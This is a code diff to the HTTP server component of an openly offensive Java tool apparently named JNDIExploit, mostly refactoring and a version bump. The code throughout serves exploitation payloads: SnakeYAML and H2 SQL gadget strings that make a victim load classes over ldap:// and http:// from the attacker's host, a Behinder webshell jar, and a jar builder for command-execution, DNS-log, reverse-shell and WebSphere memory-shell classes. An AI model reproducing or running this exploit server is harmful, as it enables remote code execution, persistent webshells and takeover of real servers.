@@ -35,7 +35,7 @@ public class HTTPServer {
                 try {
                     System.out.println(ansi().eraseScreen().render(
                             "   @|green █████\\|@ @|red ██\\   ██\\|@ @|yellow ███████\\|@  @|MAGENTA ██████\\|@       @|CYAN ██\\   ██\\ ██\\   ██\\|@ \n" +
-                                    "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.3|@\n" +
+                                    "   @|green \\__██ ||@@|red ███\\  ██ ||@@|yellow ██  __██\\|@ @|MAGENTA \\_██  _||@      @|CYAN ███\\  ██ |██ |  ██ ||@ @|BG_GREEN v1.5.5|@\n" +
                                     "      @|green ██ ||@@|red ████\\ ██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@        @|CYAN ████\\ ██ |██ |  ██ ||@ @|BG_CYAN JNDIExploit-Nu1r|@\n" +
                                     "      @|green ██ ||@@|red ██ ██\\██ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@██████\\ @|CYAN ██ ██\\██ |██ |  ██ ||@\n" +
                                     "@|green ██\\   ██ ||@@|red ██ \\████ ||@@|yellow ██ |  ██ ||@  @|MAGENTA ██ ||@\\______|@|CYAN ██ \\████ |██ |  ██ ||@\n" +
@@ -105,16 +105,13 @@ public class HTTPServer {
                 "    !!java.net.URL [\"http://"+ Config.ip +":"+ Config.httpPort + "/behinder3.jar\"]\n" +
                 "  ]]\n" +
                 "]\n";
-        String yaml = "!!com.sun.rowset.JdbcRowSetImpl\n" +
-                "  dataSourceName: \"ldap://127.0.0.1:1389/basic/TomcatMemShell3\"\n" +
-                "  autoCommit: true";
 
         if (YamlName.equalsIgnoreCase("snake")) {
             System.out.println( ansi().render("@|green [+] Response Code: |@" + 200));
 //            exchange.getResponseHeaders().set("Content-type","application/octet-stream");
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
 //            exchange.sendResponseHeaders(200, yaml.getBytes().length + 1);
-            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
+            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 //            exchange.getResponseBody().write(yaml.getBytes("UTF-8"));
         }else {
             String pa = cwd + File.separator + "data";
@@ -314,7 +311,7 @@ public class HTTPServer {
                     "{Object o = com.sun.rowset.JdbcRowSetImpl();',' o.setDataSourceName(\"ldap://" + host + ":1389/TomcatBypass/TomcatEcho\");',' 'o.setAutoCommit(\"true\");,'}');" +
                     "CALL " + name + "();\"}";
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
-            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
+            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
         }else if(sqlName.equalsIgnoreCase("inject")){
             System.out.println("@|green  Response Code: |@" + 200);
 
@@ -323,7 +320,7 @@ public class HTTPServer {
                     "{Object o = com.sun.rowset.JdbcRowSetImpl();',' o.setDataSourceName(\"ldap:// + host + :1389/inject.class\");',' 'o.setAutoCommit(\"true\");,'}');" +
                     "CALL " + name + "();\"}";
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
-            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
+            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 
         }else{
 
@@ -364,7 +361,7 @@ public class HTTPServer {
                     "}\n";
 
             exchange.sendResponseHeaders(200, bytes.getBytes().length + 1);
-            exchange.getResponseBody().write(bytes.getBytes("UTF-8"));
+            exchange.getResponseBody().write(bytes.getBytes(StandardCharsets.UTF_8));
 
         }else{
             String pa = cwd + File.separator + "data";
@@ -403,7 +400,7 @@ public class HTTPServer {
         String jarName = path.substring(path.lastIndexOf("/") + 1, path.lastIndexOf("."));
 
         if (jarName.equalsIgnoreCase("behinder3")){
-            byte[] bytes =  null;
+            byte[] bytes;
             String filename =  cwd + File.separator +"data" + File.separator + "behinder3.jar";
             FileReader fileReader = new FileReader(filename,"UTF-8");
             bytes = fileReader.readBytes();
@@ -414,7 +411,7 @@ public class HTTPServer {
             String filename =  cwd + File.separator +"data" + File.separator + jarName + ".jar";
             File file = new File(filename);
             if (file.exists()){
-                byte[] bytes =  null;
+                byte[] bytes;
                 FileReader fileReader = new FileReader(filename,"UTF-8");
                 bytes = fileReader.readBytes();
                 exchange.sendResponseHeaders(200, bytes.length + 1);
@@ -536,7 +533,7 @@ public class HTTPServer {
     }
 
     private static Map<String, String> parseQuery(String query){
-        Map<String,String> params = new HashMap<String, String>();
+        Map<String,String> params = new HashMap<>();
 
         try{
             for(String str : query.split("&")){
@@ -560,26 +557,31 @@ public class HTTPServer {
          目前暂时认为其不会有问题，如果有问题，后面再修改
     */
     private static String createJar(String type, String... params) throws Exception {
-        byte[] bytes = new byte[0];
+        byte[] bytes;
         String className = "xExportObject";
 
-        if (type.toLowerCase().equals("command")) {
-            CommandTemplate commandTemplate = new CommandTemplate(params[0], "xExportObject");
-            bytes = commandTemplate.getBytes();
-        } else if (type.toLowerCase().equals("dnslog")){
-            DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0], "xExportObject");
-            bytes = dnslogTemplate.getBytes();
-        } else if (type.toLowerCase().equals("reverseshell")) {
-            ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1], "xExportObject");
-            bytes = reverseShellTemplate.getBytes();
-        } else if (type.toLowerCase().equals("webspherememshell")) {
-            ClassPool classPool = ClassPool.getDefault();
-            CtClass exploitClass = classPool.get("com.feihong.ldap.template.WebsphereMemshellTemplate");
-            exploitClass.setName(className);
-            exploitClass.detach();
-            bytes = exploitClass.toBytecode();
-        }else{
-            return null;
+        switch (type.toLowerCase()) {
+            case "command":
+                CommandTemplate commandTemplate = new CommandTemplate(params[0], "xExportObject");
+                bytes = commandTemplate.getBytes();
+                break;
+            case "dnslog":
+                DnslogTemplate dnslogTemplate = new DnslogTemplate(params[0], "xExportObject");
+                bytes = dnslogTemplate.getBytes();
+                break;
+            case "reverseshell":
+                ReverseShellTemplate reverseShellTemplate = new ReverseShellTemplate(params[0], params[1], "xExportObject");
+                bytes = reverseShellTemplate.getBytes();
+                break;
+            case "webspherememshell":
+                ClassPool classPool = ClassPool.getDefault();
+                CtClass exploitClass = classPool.get("com.feihong.ldap.template.WebsphereMemshellTemplate");
+                exploitClass.setName(className);
+                exploitClass.detach();
+                bytes = exploitClass.toBytecode();
+                break;
+            default:
+                return null;
         }
 
         System.out.println( ansi().render("@|green [+] Name of Class in Jar: |@" + className));
